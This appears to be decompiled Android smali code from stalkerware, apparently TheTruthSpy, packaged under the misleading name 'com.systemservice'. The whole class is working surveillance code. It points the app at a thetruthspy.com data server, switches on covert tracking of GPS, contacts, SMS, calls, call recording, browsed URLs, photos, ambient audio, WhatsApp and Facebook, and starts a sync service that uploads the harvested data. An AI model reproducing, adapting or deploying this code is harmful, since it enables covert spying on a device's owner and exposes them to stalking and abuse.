.class public Lcom/systemservice/common/groupService/UIAppController;
.super Lcom/systemservice/common/groupService/UIMonitorApplication;
.source ""


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Lcom/systemservice/common/groupService/UIMonitorApplication;-><init>()V

    return-void
.end method

.method private c()V
    .locals 6

    :try_start_0
    const-string v0, "%p - %d - [%c] : %m%n"

    const/4 v1, 0x3

    const-wide/32 v2, 0x80000

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "data/data/"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "/log/log4j.txt"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/systemservice/a/a/j;->i:Ljava/lang/String;

    invoke-static {}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    sput-object v4, Lcom/systemservice/a/a/j;->j:Ljava/lang/String;

    sget-object v4, Lcom/systemservice/a/a/j;->i:Ljava/lang/String;

    invoke-static {v4, v0, v1, v2, v3}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;Ljava/lang/String;IJ)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :goto_0
    return-void
.end method


# virtual methods
.method protected a(Lcom/systemservice/a/d/e;Landroid/content/IntentFilter;)V
    .locals 7

    const-string p1, "UIAppController"

    :try_start_0
    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "app_prefs_settings"

    const/4 v3, 0x0

    invoke-virtual {v1, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "default_data_server"

    const-string v4, "protocol-a943.thetruthspy.com/protocols"

    invoke-interface {v1, v2, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    invoke-static {v0}, Lcom/systemservice/a/h/b;->a(Landroid/content/Context;)V

    invoke-static {}, Lcom/systemservice/a/a/l;->c()V

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lcom/systemservice/a/g/a;->a(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    :try_start_1
    invoke-static {}, Lcom/google/firebase/iid/FirebaseInstanceId;->b()Lcom/google/firebase/iid/FirebaseInstanceId;

    move-result-object v1

    invoke-virtual {v1}, Lcom/google/firebase/iid/FirebaseInstanceId;->c()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    :try_start_2
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ""

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    invoke-static {v0}, Lcom/systemservice/a/a/l;->c(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_0

    new-instance v1, Lcom/systemservice/common/features/gpsHistory/d;

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "gps_active"

    new-instance v5, Lcom/systemservice/common/features/gpsHistory/e;

    invoke-direct {v5, v0, v3}, Lcom/systemservice/common/features/gpsHistory/e;-><init>(Landroid/content/Context;Z)V

    new-instance v6, Lcom/systemservice/a/h/i;

    invoke-direct {v6, p0}, Lcom/systemservice/a/h/i;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5, v6}, Lcom/systemservice/common/features/gpsHistory/d;-><init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/i;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    :cond_0
    new-instance v1, Lcom/systemservice/a/c/e/d;

    const-string v2, "contact_active"

    new-instance v4, Lcom/systemservice/a/c/e/e;

    invoke-direct {v4, v0, v3}, Lcom/systemservice/a/c/e/e;-><init>(Landroid/content/Context;Z)V

    new-instance v5, Lcom/systemservice/a/h/h;

    invoke-direct {v5, p0}, Lcom/systemservice/a/h/h;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5}, Lcom/systemservice/a/c/e/d;-><init>(Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/h;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/h/g;

    const-string v2, "sms_active"

    new-instance v4, Lcom/systemservice/a/c/h/j;

    invoke-direct {v4, v0, v3}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    new-instance v5, Lcom/systemservice/a/h/k;

    invoke-direct {v5, p0}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5}, Lcom/systemservice/a/c/h/g;-><init>(Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/k;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/c/i;

    const-string v2, "call_active"

    new-instance v4, Lcom/systemservice/a/c/c/n;

    invoke-direct {v4, v0, v3}, Lcom/systemservice/a/c/c/n;-><init>(Landroid/content/Context;Z)V

    new-instance v5, Lcom/systemservice/a/h/f;

    invoke-direct {v5, p0}, Lcom/systemservice/a/h/f;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5}, Lcom/systemservice/a/c/c/i;-><init>(Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/f;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/c/m;

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "is_record_call_active"

    new-instance v5, Lcom/systemservice/a/c/c/o;

    invoke-direct {v5, v0, v3}, Lcom/systemservice/a/c/c/o;-><init>(Landroid/content/Context;Z)V

    new-instance v6, Lcom/systemservice/a/h/m;

    invoke-direct {v6, p0}, Lcom/systemservice/a/h/m;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5, v6}, Lcom/systemservice/a/c/c/m;-><init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/m;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/b/c;

    const-string v2, "url_active"

    new-instance v4, Lcom/systemservice/a/c/b/d;

    invoke-direct {v4, v0, v3}, Lcom/systemservice/a/c/b/d;-><init>(Landroid/content/Context;Z)V

    new-instance v5, Lcom/systemservice/a/h/n;

    invoke-direct {v5, p0}, Lcom/systemservice/a/h/n;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5}, Lcom/systemservice/a/c/b/c;-><init>(Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/n;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/g/d;

    const-string v2, "photo_active"

    new-instance v4, Lcom/systemservice/a/c/g/e;

    invoke-direct {v4, v0, v3}, Lcom/systemservice/a/c/g/e;-><init>(Landroid/content/Context;Z)V

    new-instance v5, Lcom/systemservice/a/h/l;

    invoke-direct {v5, p0}, Lcom/systemservice/a/h/l;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5}, Lcom/systemservice/a/c/g/d;-><init>(Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/l;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/c/e;

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "ambient_record_active"

    new-instance v5, Lcom/systemservice/common/features/settingHistory/d;

    invoke-direct {v5, v0, v3}, Lcom/systemservice/common/features/settingHistory/d;-><init>(Landroid/content/Context;Z)V

    invoke-direct {v1, v2, v4, v5}, Lcom/systemservice/a/c/c/e;-><init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/h/i;

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "is_whatsapp_installed"

    new-instance v5, Lcom/systemservice/a/c/h/j;

    invoke-direct {v5, v0, v3}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    new-instance v6, Lcom/systemservice/a/h/k;

    invoke-direct {v6, p0}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5, v6}, Lcom/systemservice/a/c/h/i;-><init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/k;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V

    new-instance v1, Lcom/systemservice/a/c/h/b;

    invoke-virtual {p0}, Landroid/app/Application;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v4, "is_facebook_installed"

    new-instance v5, Lcom/systemservice/a/c/h/j;

    invoke-direct {v5, v0, v3}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    new-instance v3, Lcom/systemservice/a/h/k;

    invoke-direct {v3, p0}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    invoke-direct {v1, v2, v4, v5, v3}, Lcom/systemservice/a/c/h/b;-><init>(Landroid/content/Context;Ljava/lang/String;Lcom/systemservice/common/features/settingHistory/b;Lcom/systemservice/a/h/k;)V

    invoke-virtual {p0, v1, p2}, Lcom/systemservice/common/groupService/UIMonitorApplication;->a(Lcom/systemservice/a/d/a;Landroid/content/IntentFilter;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :try_start_3
    new-instance p2, Landroid/content/Intent;

    const-class v1, Lcom/systemservice/common/groupService/UIAppSchedulingService;

    invoke-direct {p2, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "isSyncNow"

    const-string v2, "1"

    invoke-virtual {p2, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {v0, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_1

    :catch_1
    move-exception p2

    :try_start_4
    invoke-virtual {p2}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p2

    invoke-static {p1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    invoke-direct {p0}, Lcom/systemservice/common/groupService/UIAppController;->c()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_2

    :catch_2
    move-exception p2

    invoke-virtual {p2}, Ljava/lang/Exception;->getLocalizedMessage()Ljava/lang/String;

    move-result-object p2

    invoke-static {p1, p2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_2
    return-void
.end method
